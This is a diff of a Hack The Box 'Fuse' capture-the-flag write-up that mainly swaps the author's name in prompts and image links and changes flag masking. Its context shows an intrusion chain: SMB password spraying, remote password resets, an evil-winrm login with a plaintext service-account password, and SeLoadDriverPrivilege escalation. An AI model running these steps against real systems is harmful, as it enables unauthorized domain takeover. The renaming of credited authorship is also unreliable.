@@ -9,6 +9,7 @@ avatar: assets/htb/fuse.png
 source: https://github.com/zweilosec/htb-writeups (MIT)
 htb_url: https://app.hackthebox.com/machines/Fuse
 ---
+
 ## Overview
 
 This medium-difficulty Windows machine gave me a chance to exploit a vulnerable service that we hear of often in training as being an overlooked problem for many Enterprises: printer management.  While this challenge did not involve exploiting an actual print spooler service, it drew attention to the problems that misconfigurations can cause especially when dealing with credentialed service accounts.
@@ -30,7 +31,7 @@ For this machine I tried using the Three Ms \(tm\) a bit more than usual, to som
 I started my enumeration with an nmap scan of `<YOUR_IP>`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oA <name>` saves the output with a filename of `<name>`.
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/fuse]
+┌──(kac0㉿kali)-[~/htb/fuse]
 └─$ nmap -n -v -p- -sCV -oA fuse <YOUR_IP>    
 
 Nmap scan report for <YOUR_IP>
@@ -103,15 +104,15 @@ Nmap done: 1 IP address (1 host up) scanned in 410.91 seconds
 
 This machine had many ports open. From the ports and services that were open this appeared to be a domain controller running Windows Server 2016.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/1-papercut.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1-papercut.png)
 
 Navigating to port 80 redirected me to [http://fuse.fabricorp.local/papercut/logs/html/index.htm](http://fuse.fabricorp.local/papercut/logs/html/index.htm).  I had to add `fuse.fabricorp.local` to my local hosts file to proceed.  I was greeted by a PaperCut print logger site, without any authentication protecting it. I clicked on view HTML for each of the print history pages to see what kind of documents had been printed recently.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/1-29may.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1-29may.png)
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/1-30may%2520%25281%2529%2520%25281%2529.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1-30may%2520%25281%2529%2520%25281%2529.png)
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/1-10jun.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1-10jun.png)
 
 Each of the three pages contained potential usernames and client computer names in the print history and a number of interesting sounding document titles.
 
@@ -162,11 +163,11 @@ msf5 auxiliary(gather/kerberos_enumusers) > run
 
 Unfortunately these users all had Kerberos pre-authentication enabled, but I was able to confirm that all of them were valid usernames.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/1-papercut-about.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1-papercut-about.png)
 
 At first I started chasing the little white rabbit while doing research about this PaperCut service.  
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/5-deleted-files.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/5-deleted-files.png)
 
 I managed to find some interesting results that looked like a potential way to retrieve printed documents through backups, but either I did not have the proper privileges, or these options were not active on this site. 
 
@@ -245,17 +246,17 @@ msf5 auxiliary(scanner/smb/smb_login) > run
 After running the `smb_login` scanner I found that not only had one person used this as their password, but three people had!
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/fuse]
+┌──(kac0㉿kali)-[~/htb/fuse]
 └─$ smbclient -U "FABRICORP\bnielson" -L \\\\<YOUR_IP>\\
 Enter FABRICORP\bnielson's password: 
 session setup failed: NT_STATUS_PASSWORD_MUST_CHANGE
 
-┌──(zweilos㉿kali)-[~/htb/fuse]
+┌──(kac0㉿kali)-[~/htb/fuse]
 └─$ smbclient -U "FABRICORP\tlavel" -L \\\\<YOUR_IP>\\                                           1 ⨯
 Enter FABRICORP\tlavel's password: 
 session setup failed: NT_STATUS_PASSWORD_MUST_CHANGE
 
-┌──(zweilos㉿kali)-[~/htb/fuse]
+┌──(kac0㉿kali)-[~/htb/fuse]
 └─$ smbclient -U "FABRICORP\bhult" -L \\\\<YOUR_IP>\\                                            1 ⨯
 Enter FABRICORP\bhult's password: 
 session setup failed: NT_STATUS_PASSWORD_MUST_CHANGE
@@ -289,7 +290,7 @@ However, I got an interesting error back when trying to enumerate open shares fo
 I checked the man page for `smbpasswd` to see what the `-r` and `-U` options did, and found out that that these flags let me specify a remote host \(`-r`\) and username \(`U`\). 
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/fuse]
+┌──(kac0㉿kali)-[~/htb/fuse]
 └─$ smbpasswd -r <YOUR_IP> -U bnielson                                                           1 ⨯
 Old SMB password: Fabricorp01
 New SMB password: test
@@ -304,7 +305,7 @@ The passwords will not show up on the screen like in my output above and below. 
 {% endhint %}
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/fuse]
+┌──(kac0㉿kali)-[~/htb/fuse]
 └─$ smbpasswd -r <YOUR_IP> -U bnielson                                                         
 Old SMB password: Fabricorp01
 New SMB password: $Up3rC0mp13xP@$$w0rd
@@ -319,7 +320,7 @@ If you change a user's password, and find that after a minute or so that your pa
 {% endhint %}
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/fuse]
+┌──(kac0㉿kali)-[~/htb/fuse]
 └─$ smbclient -U "bnielson" -L \\\\<YOUR_IP>\\ 
 Enter WORKGROUP\bnielson's password: 
 
@@ -338,7 +339,7 @@ SMB1 disabled -- no workgroup available
 Next I used my new password for `bnielson` to enumerate open SMB shares. Besides the standard default shares, there were also a `HP-MFT01` and a `$print` share.
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/fuse]
+┌──(kac0㉿kali)-[~/htb/fuse]
 └─$ rpcclient -U bnielson <YOUR_IP>   
 Enter WORKGROUP\bnielson's password: 
 
@@ -614,7 +615,7 @@ Next I ran a brute force login attack against SMB after adding the new usernames
 I tried using the winrm enumeration module in metasploit, but for some reason it returned no valid logins. After playing around with different things for awhile trying to get something to work, the colored text in ZSH saved me. I noticed that the `$` in the password were being interpreted as a special character by the terminal. Once I wrapped the password in single quotes I was able to login using `evil-winrm`.
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/fuse]
+┌──(kac0㉿kali)-[~/htb/fuse]
 └─$ evil-winrm -u svc-print -p '$fab@s3Rv1ce$1' -i <YOUR_IP> -P 5985                             
 
 Evil-WinRM shell v2.3
@@ -710,7 +711,7 @@ Mode                LastWriteTime         Length Name
 -ar---        9/25/2020   1:23 PM             34 user.txt
 
 *Evil-WinRM* PS C:\users\svc-print\Desktop> type user.txt
-cea5****6553
+cea5************************6553
 ```
 
 `tree` gave some odd looking output, but showed me that the `user.txt` proof was right there in my service account user's Desktop! \(Why a service account has a Desktop I am not sure...\)
@@ -800,7 +801,7 @@ Same with running services. I did notice that there was the print service for Pa
 I decided that since the service account had the `SeLoadDriverPrivilege` privilege I would see if there were any published privilege escalation methods using it. I quickly found one at [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/fuse]
+┌──(kac0㉿kali)-[~/htb/fuse]
 └─$ evil-winrm -u svc-print -p '$fab@s3Rv1ce$1' -i <YOUR_IP> -P 5985                             1 ⨯
 
 Evil-WinRM shell v2.3
@@ -930,7 +931,7 @@ Going back to the article I found earlier, I found a few links to files needed f
 * [https://github.com/TarlogicSecurity/EoPLoadDriver/](https://github.com/TarlogicSecurity/EoPLoadDriver/)
 * [https://github.com/tandasat/ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/exploit-capcom.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/exploit-capcom.png)
 
 Following the instructions, I had to compile the two files on Windows \(with a matching x64 architecture\).  I customized the exploit a bit to have it call a simple .bat script I wrote to send me a netcat reverse shell. The four files needed for this to work were:
 
@@ -1072,5 +1073,5 @@ dir
 
 c:\Users\Administrator\Desktop>type root.txt
 type root.txt
-9955****6944
+9955************************6944
 ```
